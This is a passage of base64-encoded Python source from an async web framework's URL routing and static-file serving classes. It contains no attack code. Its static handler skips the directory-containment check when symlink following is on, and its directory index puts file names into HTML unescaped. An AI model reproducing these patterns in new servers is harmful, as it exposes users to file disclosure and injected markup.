AgICAgICAgICAgcGFydCA9IF9yZXF1b3RlX3BhdGgocGFydClcclxuICAgICAgICAgICAgZm9ybWF0dGVyICs9IHBhcnRcclxuICAgICAgICAgICAgcGF0dGVybiArPSByZS5lc2NhcGUocGFydClcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBjb21waWxlZCA9IHJlLmNvbXBpbGUocGF0dGVybilcclxuICAgICAgICBleGNlcHQgcmUuZXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYiQmFkIHBhdHRlcm4gXCd7cGF0dGVybn1cJzoge2V4Y30iKSBmcm9tIE5vbmVcclxuICAgICAgICBhc3NlcnQgY29tcGlsZWQucGF0dGVybi5zdGFydHN3aXRoKFBBVEhfU0VQKVxyXG4gICAgICAgIGFzc2VydCBmb3JtYXR0ZXIuc3RhcnRzd2l0aCgiLyIpXHJcbiAgICAgICAgc2VsZi5fcGF0dGVybiA9IGNvbXBpbGVkXHJcbiAgICAgICAgc2VsZi5fZm9ybWF0dGVyID0gZm9ybWF0dGVyXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2Fub25pY2FsKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZm9ybWF0dGVyXHJcblxyXG4gICAgZGVmIGFkZF9wcmVmaXgoc2VsZiwgcHJlZml4OiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IHByZWZpeC5zdGFydHN3aXRoKCIvIilcclxuICAgICAgICBhc3NlcnQgbm90IHByZWZpeC5lbmRzd2l0aCgiLyIpXHJcbiAgICAgICAgYXNzZXJ0IGxlbihwcmVmaXgpID4gMVxyXG4gICAgICAgIHNlbGYuX3BhdHRlcm4gPSByZS5jb21waWxlKHJlLmVzY2FwZShwcmVmaXgpICsgc2VsZi5fcGF0dGVybi5wYXR0ZXJuKVxyXG4gICAgICAgIHNlbGYuX2Zvcm1hdHRlciA9IHByZWZpeCArIHNlbGYuX2Zvcm1hdHRlclxyXG5cclxuICAgIGRlZiBfbWF0Y2goc2VsZiwgcGF0aDogc3RyKSAtPiBPcHRpb25hbFtEaWN0W3N0ciwgc3RyXV06XHJcbiAgICAgICAgbWF0Y2ggPSBzZWxmLl9wYXR0ZXJuLmZ1bGxtYXRjaChwYXRoKVxyXG4gICAgICAgIGlmIG1hdGNoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHtcclxuICAgICAgICAgICAgICAgIGtleTogX3VucXVvdGVfcGF0aCh2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gbWF0Y2guZ3JvdXBkaWN0KCkuaXRlbXMoKVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgZGVmIHJhd19tYXRjaChzZWxmLCBwYXRoOiBzdHIpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Zvcm1hdHRlciA9PSBwYXRoXHJcblxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IF9JbmZvRGljdDpcclxuICAgICAgICByZXR1cm4geyJmb3JtYXR0ZXIiOiBzZWxmLl9mb3JtYXR0ZXIsICJwYXR0ZXJuIjogc2VsZi5fcGF0dGVybn1cclxuXHJcbiAgICBkZWYgdXJsX2ZvcihzZWxmLCAqKnBhcnRzOiBzdHIpIC0+IFVSTDpcclxuICAgICAgICB1cmwgPSBzZWxmLl9mb3JtYXR0ZXIuZm9ybWF0X21hcCh7azogX3F1b3RlX3BhdGgodikgZm9yIGssIHYgaW4gcGFydHMuaXRlbXMoKX0pXHJcbiAgICAgICAgcmV0dXJuIFVSTC5idWlsZChwYXRoPXVybCwgZW5jb2RlZD1UcnVlKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgbmFtZSA9ICJcJyIgKyBzZWxmLm5hbWUgKyAiXCcgIiBpZiBzZWxmLm5hbWUgaXMgbm90IE5vbmUgZWxzZSAiIlxyXG4gICAgICAgIHJldHVybiAiPER5bmFtaWNSZXNvdXJjZSB7bmFtZX0ge2Zvcm1hdHRlcn0+Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgIG5hbWU9bmFtZSwgZm9ybWF0dGVyPXNlbGYuX2Zvcm1hdHRlclxyXG4gICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBQcmVmaXhSZXNvdXJjZShBYnN0cmFjdFJlc291cmNlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwcmVmaXg6IHN0ciwgKiwgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IG5vdCBwcmVmaXggb3IgcHJlZml4LnN0YXJ0c3dpdGgoIi8iKSwgcHJlZml4XHJcbiAgICAgICAgYXNzZXJ0IHByZWZpeCBpbiAoIiIsICIvIikgb3Igbm90IHByZWZpeC5lbmRzd2l0aCgiLyIpLCBwcmVmaXhcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKG5hbWU9bmFtZSlcclxuICAgICAgICBzZWxmLl9wcmVmaXggPSBfcmVxdW90ZV9wYXRoKHByZWZpeClcclxuICAgICAgICBzZWxmLl9wcmVmaXgyID0gc2VsZi5fcHJlZml4ICsgIi8iXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2Fub25pY2FsKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcHJlZml4XHJcblxyXG4gICAgZGVmIGFkZF9wcmVmaXgoc2VsZiwgcHJlZml4OiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IHByZWZpeC5zdGFydHN3aXRoKCIvIilcclxuICAgICAgICBhc3NlcnQgbm90IHByZWZpeC5lbmRzd2l0aCgiLyIpXHJcbiAgICAgICAgYXNzZXJ0IGxlbihwcmVmaXgpID4gMVxyXG4gICAgICAgIHNlbGYuX3ByZWZpeCA9IHByZWZpeCArIHNlbGYuX3ByZWZpeFxyXG4gICAgICAgIHNlbGYuX3ByZWZpeDIgPSBzZWxmLl9wcmVmaXggKyAiLyJcclxuXHJcbiAgICBkZWYgcmF3X21hdGNoKHNlbGYsIHByZWZpeDogc3RyKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgICMgVE9ETzogaW1wbCBtaXNzaW5nIGFic3RyYWN0IG1ldGhvZHNcclxuXHJcblxyXG5jbGFzcyBTdGF0aWNSZXNvdXJjZShQcmVmaXhSZXNvdXJjZSk6XHJcbiAgICBWRVJTSU9OX0tFWSA9ICJ2IlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHByZWZpeDogc3RyLFxyXG4gICAgICAgIGRpcmVjdG9yeTogUGF0aExpa2UsXHJcbiAgICAgICAgKixcclxuICAgICAgICBuYW1lOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBleHBlY3RfaGFuZGxlcjogT3B0aW9uYWxbX0V4cGVjdEhhbmRsZXJdID0gTm9uZSxcclxuICAgICAgICBjaHVua19zaXplOiBpbnQgPSAyNTYgKiAxMDI0LFxyXG4gICAgICAgIHNob3dfaW5kZXg6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBmb2xsb3dfc3ltbGlua3M6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICBhcHBlbmRfdmVyc2lvbjogYm9vbCA9IEZhbHNlLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18ocHJlZml4LCBuYW1lPW5hbWUpXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBkaXJlY3RvcnkgPSBQYXRoKGRpcmVjdG9yeSlcclxuICAgICAgICAgICAgaWYgc3RyKGRpcmVjdG9yeSkuc3RhcnRzd2l0aCgifiIpOlxyXG4gICAgICAgICAgICAgICAgZGlyZWN0b3J5ID0gUGF0aChvcy5wYXRoLmV4cGFuZHVzZXIoc3RyKGRpcmVjdG9yeSkpKVxyXG4gICAgICAgICAgICBkaXJlY3RvcnkgPSBkaXJlY3RvcnkucmVzb2x2ZSgpXHJcbiAgICAgICAgICAgIGlmIG5vdCBkaXJlY3RvcnkuaXNfZGlyKCk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJOb3QgYSBkaXJlY3RvcnkiKVxyXG4gICAgICAgIGV4Y2VwdCAoRmlsZU5vdEZvdW5kRXJyb3IsIFZhbHVlRXJyb3IpIGFzIGVycm9yOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKGYiTm8gZGlyZWN0b3J5IGV4aXN0cyBhdCBcJ3tkaXJlY3Rvcnl9XCciKSBmcm9tIGVycm9yXHJcbiAgICAgICAgc2VsZi5fZGlyZWN0b3J5ID0gZGlyZWN0b3J5XHJcbiAgICAgICAgc2VsZi5fc2hvd19pbmRleCA9IHNob3dfaW5kZXhcclxuICAgICAgICBzZWxmLl9jaHVua19zaXplID0gY2h1bmtfc2l6ZVxyXG4gICAgICAgIHNlbGYuX2ZvbGxvd19zeW1saW5rcyA9IGZvbGxvd19zeW1saW5rc1xyXG4gICAgICAgIHNlbGYuX2V4cGVjdF9oYW5kbGVyID0gZXhwZWN0X2hhbmRsZXJcclxuICAgICAgICBzZWxmLl9hcHBlbmRfdmVyc2lvbiA9IGFwcGVuZF92ZXJzaW9uXHJcblxyXG4gICAgICAgIHNlbGYuX3JvdXRlcyA9IHtcclxuICAgICAgICAgICAgIkdFVCI6IFJlc291cmNlUm91dGUoXHJcbiAgICAgICAgICAgICAgICAiR0VUIiwgc2VsZi5faGFuZGxlLCBzZWxmLCBleHBlY3RfaGFuZGxlcj1leHBlY3RfaGFuZGxlclxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAiSEVBRCI6IFJlc291cmNlUm91dGUoXHJcbiAgICAgICAgICAgICAgICAiSEVBRCIsIHNlbGYuX2hhbmRsZSwgc2VsZiwgZXhwZWN0X2hhbmRsZXI9ZXhwZWN0X2hhbmRsZXJcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICB9XHJcblxyXG4gICAgZGVmIHVybF9mb3IoICAjIHR5cGU6IGlnbm9yZVtvdmVycmlkZV1cclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgZmlsZW5hbWU6IFVuaW9uW3N0ciwgUGF0aF0sXHJcbiAgICAgICAgYXBwZW5kX3ZlcnNpb246IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgICkgLT4gVVJMOlxyXG4gICAgICAgIGlmIGFwcGVuZF92ZXJzaW9uIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGFwcGVuZF92ZXJzaW9uID0gc2VsZi5fYXBwZW5kX3ZlcnNpb25cclxuICAgICAgICBpZiBpc2luc3RhbmNlKGZpbGVuYW1lLCBQYXRoKTpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBzdHIoZmlsZW5hbWUpXHJcbiAgICAgICAgZmlsZW5hbWUgPSBmaWxlbmFtZS5sc3RyaXAoIi8iKVxyXG5cclxuICAgICAgICB1cmwgPSBVUkwuYnVpbGQocGF0aD1zZWxmLl9wcmVmaXgsIGVuY29kZWQ9VHJ1ZSlcclxuICAgICAgICAjIGZpbGVuYW1lIGlzIG5vdCBlbmNvZGVkXHJcbiAgICAgICAgaWYgWUFSTF9WRVJTSU9OIDwgKDEsIDYpOlxyXG4gICAgICAgICAgICB1cmwgPSB1cmwgLyBmaWxlbmFtZS5yZXBsYWNlKCIlIiwgIiUyNSIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgdXJsID0gdXJsIC8gZmlsZW5hbWVcclxuXHJcbiAgICAgICAgaWYgYXBwZW5kX3ZlcnNpb246XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGZpbGVwYXRoID0gc2VsZi5fZGlyZWN0b3J5LmpvaW5wYXRoKGZpbGVuYW1lKS5yZXNvbHZlKClcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLl9mb2xsb3dfc3ltbGlua3M6XHJcbiAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGgucmVsYXRpdmVfdG8oc2VsZi5fZGlyZWN0b3J5KVxyXG4gICAgICAgICAgICBleGNlcHQgKFZhbHVlRXJyb3IsIEZpbGVOb3RGb3VuZEVycm9yKTpcclxuICAgICAgICAgICAgICAgICMgVmFsdWVFcnJvciBmb3IgY2FzZSB3aGVuIHBhdGggcG9pbnQgdG8gc3ltbGlua1xyXG4gICAgICAgICAgICAgICAgIyB3aXRoIGZvbGxvd19zeW1saW5rcyBpcyBGYWxzZVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHVybCAgIyByZWxhdGl2ZWx5IHNhZmVcclxuICAgICAgICAgICAgaWYgZmlsZXBhdGguaXNfZmlsZSgpOlxyXG4gICAgICAgICAgICAgICAgIyBUT0RPIGNhY2hlIGZpbGUgY29udGVudFxyXG4gICAgICAgICAgICAgICAgIyB3aXRoIGZpbGUgd2F0Y2hlciBmb3IgY2FjaGUgaW52YWxpZGF0aW9uXHJcbiAgICAgICAgICAgICAgICB3aXRoIGZpbGVwYXRoLm9wZW4oInJiIikgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBmaWxlX2J5dGVzID0gZi5yZWFkKClcclxuICAgICAgICAgICAgICAgIGggPSBzZWxmLl9nZXRfZmlsZV9oYXNoKGZpbGVfYnl0ZXMpXHJcbiAgICAgICAgICAgICAgICB1cmwgPSB1cmwud2l0aF9xdWVyeSh7c2VsZi5WRVJTSU9OX0tFWTogaH0pXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gdXJsXHJcbiAgICAgICAgcmV0dXJuIHVybFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBfZ2V0X2ZpbGVfaGFzaChieXRlX2FycmF5OiBieXRlcykgLT4gc3RyOlxyXG4gICAgICAgIG0gPSBoYXNobGliLnNoYTI1NigpICAjIHRvZG8gc2hhMjU2IGNhbiBiZSBjb25maWd1cmFibGUgcGFyYW1cclxuICAgICAgICBtLnVwZGF0ZShieXRlX2FycmF5KVxyXG4gICAgICAgIGI2NCA9IGJhc2U2NC51cmxzYWZlX2I2NGVuY29kZShtLmRpZ2VzdCgpKVxyXG4gICAgICAgIHJldHVybiBiNjQuZGVjb2RlKCJhc2NpaSIpXHJcblxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IF9JbmZvRGljdDpcclxuICAgICAgICByZXR1cm4ge1xyXG4gICAgICAgICAgICAiZGlyZWN0b3J5Ijogc2VsZi5fZGlyZWN0b3J5LFxyXG4gICAgICAgICAgICAicHJlZml4Ijogc2VsZi5fcHJlZml4LFxyXG4gICAgICAgICAgICAicm91dGVzIjogc2VsZi5fcm91dGVzLFxyXG4gICAgICAgIH1cclxuXHJcbiAgICBkZWYgc2V0X29wdGlvbnNfcm91dGUoc2VsZiwgaGFuZGxlcjogSGFuZGxlcikgLT4gTm9uZTpcclxuICAgICAgICBpZiAiT1BUSU9OUyIgaW4gc2VsZi5fcm91dGVzOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIk9QVElPTlMgcm91dGUgd2FzIHNldCBhbHJlYWR5IilcclxuICAgICAgICBzZWxmLl9yb3V0ZXNbIk9QVElPTlMiXSA9IFJlc291cmNlUm91dGUoXHJcbiAgICAgICAgICAgICJPUFRJT05TIiwgaGFuZGxlciwgc2VsZiwgZXhwZWN0X2hhbmRsZXI9c2VsZi5fZXhwZWN0X2hhbmRsZXJcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlc29sdmUoc2VsZiwgcmVxdWVzdDogUmVxdWVzdCkgLT4gX1Jlc29sdmU6XHJcbiAgICAgICAgcGF0aCA9IHJlcXVlc3QucmVsX3VybC5yYXdfcGF0aFxyXG4gICAgICAgIG1ldGhvZCA9IHJlcXVlc3QubWV0aG9kXHJcbiAgICAgICAgYWxsb3dlZF9tZXRob2RzID0gc2V0KHNlbGYuX3JvdXRlcylcclxuICAgICAgICBpZiBub3QgcGF0aC5zdGFydHN3aXRoKHNlbGYuX3ByZWZpeDIpIGFuZCBwYXRoICE9IHNlbGYuX3ByZWZpeDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmUsIHNldCgpXHJcblxyXG4gICAgICAgIGlmIG1ldGhvZCBub3QgaW4gYWxsb3dlZF9tZXRob2RzOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZSwgYWxsb3dlZF9tZXRob2RzXHJcblxyXG4gICAgICAgIG1hdGNoX2RpY3QgPSB7ImZpbGVuYW1lIjogX3VucXVvdGVfcGF0aChwYXRoW2xlbihzZWxmLl9wcmVmaXgpICsgMSA6XSl9XHJcbiAgICAgICAgcmV0dXJuIChVcmxNYXBwaW5nTWF0Y2hJbmZvKG1hdGNoX2RpY3QsIHNlbGYuX3JvdXRlc1ttZXRob2RdKSwgYWxsb3dlZF9tZXRob2RzKVxyXG5cclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYuX3JvdXRlcylcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gSXRlcmF0b3JbQWJzdHJhY3RSb3V0ZV06XHJcbiAgICAgICAgcmV0dXJuIGl0ZXIoc2VsZi5fcm91dGVzLnZhbHVlcygpKVxyXG5cclxuICAgIGFzeW5jIGRlZiBfaGFuZGxlKHNlbGYsIHJlcXVlc3Q6IFJlcXVlc3QpIC0+IFN0cmVhbVJlc3BvbnNlOlxyXG4gICAgICAgIHJlbF91cmwgPSByZXF1ZXN0Lm1hdGNoX2luZm9bImZpbGVuYW1lIl1cclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGZpbGVuYW1lID0gUGF0aChyZWxfdXJsKVxyXG4gICAgICAgICAgICBpZiBmaWxlbmFtZS5hbmNob3I6XHJcbiAgICAgICAgICAgICAgICAjIHJlbF91cmwgaXMgYW4gYWJzb2x1dGUgbmFtZSBsaWtlXHJcbiAgICAgICAgICAgICAgICAjIC9zdGF0aWMvXFxcXG1hY2hpbmVfbmFtZVxcYyQgb3IgL3N0YXRpYy9EOlxccGF0aFxyXG4gICAgICAgICAgICAgICAgIyB3aGVyZSB0aGUgc3RhdGljIGRpciBpcyB0b3RhbGx5IGRpZmZlcmVudFxyXG4gICAgICAgICAgICAgICAgcmFpc2UgSFRUUEZvcmJpZGRlbigpXHJcbiAgICAgICAgICAgIGZpbGVwYXRoID0gc2VsZi5fZGlyZWN0b3J5LmpvaW5wYXRoKGZpbGVuYW1lKS5yZXNvbHZlKClcclxuICAgICAgICAgICAgaWYgbm90IHNlbGYuX2ZvbGxvd19zeW1saW5rczpcclxuICAgICAgICAgICAgICAgIGZpbGVwYXRoLnJlbGF0aXZlX3RvKHNlbGYuX2RpcmVjdG9yeSlcclxuICAgICAgICBleGNlcHQgKFZhbHVlRXJyb3IsIEZpbGVOb3RGb3VuZEVycm9yKSBhcyBlcnJvcjpcclxuICAgICAgICAgICAgIyByZWxhdGl2ZWx5IHNhZmVcclxuICAgICAgICAgICAgcmFpc2UgSFRUUE5vdEZvdW5kKCkgZnJvbSBlcnJvclxyXG4gICAgICAgIGV4Y2VwdCBIVFRQRm9yYmlkZGVuOlxyXG4gICAgICAgICAgICByYWlzZVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXJyb3I6XHJcbiAgICAgICAgICAgICMgcGVybSBlcnJvciBvciBvdGhlciBraW5kIVxyXG4gICAgICAgICAgICByZXF1ZXN0LmFwcC5sb2dnZXIuZXhjZXB0aW9uKGVycm9yKVxyXG4gICAgICAgICAgICByYWlzZSBIVFRQTm90Rm91bmQoKSBmcm9tIGVycm9yXHJcblxyXG4gICAgICAgICMgb24gb3BlbmluZyBhIGRpciwgbG9hZCBpdHMgY29udGVudHMgaWYgYWxsb3dlZFxyXG4gICAgICAgIGlmIGZpbGVwYXRoLmlzX2RpcigpOlxyXG4gICAgICAgICAgICBpZiBzZWxmLl9zaG93X2luZGV4OlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBSZXNwb25zZShcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGV4dD1zZWxmLl9kaXJlY3RvcnlfYXNfaHRtbChmaWxlcGF0aCksIGNvbnRlbnRfdHlwZT0idGV4dC9odG1sIlxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgSFRUUEZvcmJpZGRlbigpXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBIVFRQRm9yYmlkZGVuKClcclxuICAgICAgICBlbGlmIGZpbGVwYXRoLmlzX2ZpbGUoKTpcclxuICAgICAgICAgICAgcmV0dXJuIEZpbGVSZXNwb25zZShmaWxlcGF0aCwgY2h1bmtfc2l6ZT1zZWxmLl9jaHVua19zaXplKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIEhUVFBOb3RGb3VuZFxyXG5cclxuICAgIGRlZiBfZGlyZWN0b3J5X2FzX2h0bWwoc2VsZiwgZmlsZXBhdGg6IFBhdGgpIC0+IHN0cjpcclxuICAgICAgICAjIHJldHVybnMgZGlyZWN0b3J5XCdzIGluZGV4IGFzIGh0bWxcclxuXHJcbiAgICAgICAgIyBzYW5pdHkgY2hlY2tcclxuICAgICAgICBhc3NlcnQgZmlsZXBhdGguaXNfZGlyKClcclxuXHJcbiAgICAgICAgcmVsYXRpdmVfcGF0aF90b19kaXIgPSBmaWxlcGF0aC5yZWxhdGl2ZV90byhzZWxmLl9kaXJlY3RvcnkpLmFzX3Bvc2l4KClcclxuICAgICAgICBpbmRleF9vZiA9IGYiSW5kZXggb2YgL3tyZWxhdGl2ZV9wYXRoX3RvX2Rpcn0iXHJcbiAgICAgICAgaDEgPSBmIjxoMT57aW5kZXhfb2Z9PC9oMT4iXHJcblxyXG4gICAgICAgIGluZGV4X2xpc3QgPSBbXVxyXG4gICAgICAgIGRpcl9pbmRleCA9IGZpbGVwYXRoLml0ZXJkaXIoKVxyXG4gICAgICAgIGZvciBfZmlsZSBpbiBzb3J0ZWQoZGlyX2luZGV4KTpcclxuICAgICAgICAgICAgIyBzaG93IGZpbGUgdXJsIGFzIHJlbGF0aXZlIHRvIHN0YXRpYyBwYXRoXHJcbiAgICAgICAgICAgIHJlbF9wYXRoID0gX2ZpbGUucmVsYXRpdmVfdG8oc2VsZi5fZGlyZWN0b3J5KS5hc19wb3NpeCgpXHJcbiAgICAgICAgICAgIGZpbGVfdXJsID0gc2VsZi5fcHJlZml4ICsgIi8iICsgcmVsX3BhdGhcclxuXHJcbiAgICAgICAgICAgICMgaWYgZmlsZSBpcyBhIGRpcmVjdG9yeSwgYWRkIFwnL1wnIHRvIHRoZSBlbmQgb2YgdGhlIG5hbWVcclxuICAgICAgICAgICAgaWYgX2ZpbGUuaXNfZGlyKCk6XHJcbiAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBmIntfZmlsZS5uYW1lfS8iXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBfZmlsZS5uYW1lXHJcblxyXG4gICAgICAgICAgICBpbmRleF9saXN0LmFwcGVuZChcclxuICAgICAgICAgICAgICAgIFwnPGxpPjxhIGhyZWY9Int1cmx9Ij57bmFtZX08L2E+PC9saT5cJy5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgdXJsPWZpbGVfdXJsLCBuYW1lPWZpbGVfbmFtZVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgdWwgPSAiPHVsPlxcbnt9XFxuPC91bD4iLmZvcm1hdCgiXFxuIi5qb2luKGluZGV4X2xpc3QpKVxyXG4gICAgICAgIGJvZHkgPSBmIjxib2R5PlxcbntoMX1cXG57dWx9XFxuPC9ib2R5PiJcclxuXHJcbiAgICAgICAgaGVhZF9zdHIgPSBmIjxoZWFkPlxcbjx0aXRsZT57aW5kZXhfb2Z9PC90aXRsZT5cXG48L2hlYWQ+IlxyXG4gICAgICAgIGh0bWwgPSBmIjxodG1sPlxcbntoZWFkX3N0cn1cXG57Ym9keX1cXG48L2h0bWw+IlxyXG5cclxuICAgICAgICByZXR1cm4gaHRtbFxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgbmFtZSA9ICJcJyIgKyBzZWxmLm5hbWUgKyAiXCciIGlmIHNlbGYubmFtZSBpcyBub3QgTm9uZSBlbHNlICIiXHJcbiAgICAgICAgcmV0dXJuICI8U3RhdGljUmVzb3VyY2Uge25hbWV9IHtwYXRofSAtPiB7ZGlyZWN0b3J5IXJ9PiIuZm9ybWF0KFxyXG4gICAgICAgICAgICBuYW1lPW5hbWUsIHBhdGg9c2VsZi5fcHJlZml4LCBkaXJlY3Rvcnk9c2VsZi5fZGlyZWN0b3J5XHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIFByZWZpeGVkU3ViQXBwUmVzb3VyY2UoUHJlZml4UmVzb3VyY2UpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHByZWZpeDogc3RyLCBhcHA6ICJBcHBsaWNhdGlvbiIpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhwcmVmaXgpXHJcbiAgICAgICAgc2VsZi5fYXBwID0gYXBwXHJcbiAgICAgICAgZm9yIHJlc291cmNlIGluIGFwcC5yb3V0ZXIucmVzb3VyY2VzKCk6XHJcbiAgICAgICAgICAgIHJlc291cmNlLmFkZF9wcmVmaXgocHJlZml4KVxyXG5cclxuICAgIGRlZiBhZGRfcHJlZml4KHNlbGYsIHByZWZpeDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuYWRkX3ByZWZpeChwcmVmaXgpXHJcbiAgICAgICAgZm9yIHJlc291cmNlIGluIHNlbGYuX2FwcC5yb3V0ZXIucmVzb3VyY2VzKCk6XHJcbiAgICAgICAgICAgIHJlc291cmNlLmFkZF9wcmVmaXgocHJlZml4KVxyXG5cclxuICAgIGRlZiB1cmxfZm9yKHNlbGYsICphcmdzOiBzdHIsICoqa3dhcmdzOiBzdHIpIC0+IFVSTDpcclxuICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIi51cmxfZm9yKCkgaXMgbm90IHN1cHBvcnRlZCAiICJieSBzdWItYXBwbGljYXRpb24gcm9vdCIpXHJcblxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IF9JbmZvRGljdDpcclxuICAgICAgICByZXR1cm4geyJhcHAiOiBzZWxmLl9hcHAsICJwcmVmaXgiOiBzZWxmLl9wcmVmaXh9XHJcblxyXG4gICAgYXN5bmMgZGVmIHJlc29sdmUoc2VsZiwgcmVxdWVzdDogUmVxdWVzdCkgLT4gX1Jlc29sdmU6XHJcbiAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICBub3QgcmVxdWVzdC51cmwucmF3X3BhdGguc3RhcnRzd2l0aChzZWxmLl9wcmVmaXgyKVxyXG4gICAgICAgICAgICBhbmQgcmVxdWVzdC51cmwucmF3X3BhdGggIT0gc2VsZi5fcHJlZml4XHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmUsIHNldCgpXHJcbiAgICAgICAgbWF0Y2hfaW5mbyA9IGF3YWl0IHNlbGYuX2FwcC5yb3V0ZXIucmVzb2x2ZShyZXF1ZXN0KVxyXG4gICAgICAgIG1hdGNoX2luZm8uYWRkX2FwcChzZWxmLl9hcHApXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShtYXRjaF9pbmZvLmh0dHBfZXhjZXB0aW9uLCBIVFRQTWV0aG9kTm90QWxsb3dlZCk6XHJcbiAgICAgICAgICAgIG1ldGhvZHMgPSBtYXRjaF9pbmZvLmh0dHBfZXhjZXB0aW9uLmFsbG93ZWRfbWV0aG9kc1xyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIG1ldGhvZHMgPSBzZXQoKVxyXG4gICAgICAgIHJldHVybiBtYXRjaF9pbmZvLCBtZXRob2RzXHJcblxyXG4gICAgZGVmIF9fbGVuX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5fYXBwLnJvdXRlci5yb3V0ZXMoKSlcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gSXRlcmF0b3JbQWJzdHJhY3RSb3V0ZV06XHJcbiAgICAgICAgcmV0dXJuIGl0ZXIoc2VsZi5fYXBwLnJvdXRlci5yb3V0ZXMoKSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPFByZWZpeGVkU3ViQXBwUmVzb3VyY2Uge3ByZWZpeH0gLT4ge2FwcCFyfT4iLmZvcm1hdChcclxuICAgICAgICAgICAgcHJlZml4PX